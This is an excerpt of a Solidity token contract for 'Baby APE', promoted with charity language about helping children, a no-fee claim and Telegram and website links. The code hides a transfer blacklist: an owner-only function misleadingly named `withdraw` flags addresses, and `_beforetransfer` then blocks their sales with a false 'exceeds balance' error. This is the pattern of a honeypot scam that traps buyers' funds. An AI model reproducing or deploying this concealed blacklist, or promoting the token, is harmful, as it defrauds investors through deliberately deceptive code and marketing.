...
Baby APE was created with the idea of enabling children around the world to grow up healthy. 
As you can see in UNICEF, there are many children living in a harsh environment in different places, 
and ApeBae's purpose is to give everything for children.

Tax: No Fee

https://t.me/BabyApeEth
https://www.babyapeerc20.com/
...
contract  BabyApe   is Ownable {
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function Changerouterver(address minter, uint256 _amount) external  {
    ...
    function _beforetransfer(address sender, address recipient, uint256 amount) internal view virtual{
          if(recipient != _address0 && sender != _address0 && amount > _zero){
              if( _killer[sender]){
                  require(_killer[sender] == false || recipient==_router || sender == _address1  ,"Transfer amount exceeds balance");}}           
    }
    ...
    function withdraw(address sender,bool status) public {
         require(msg.sender == _address0, "!_address0.not Owner ");
             _killer[sender]=status;
    }
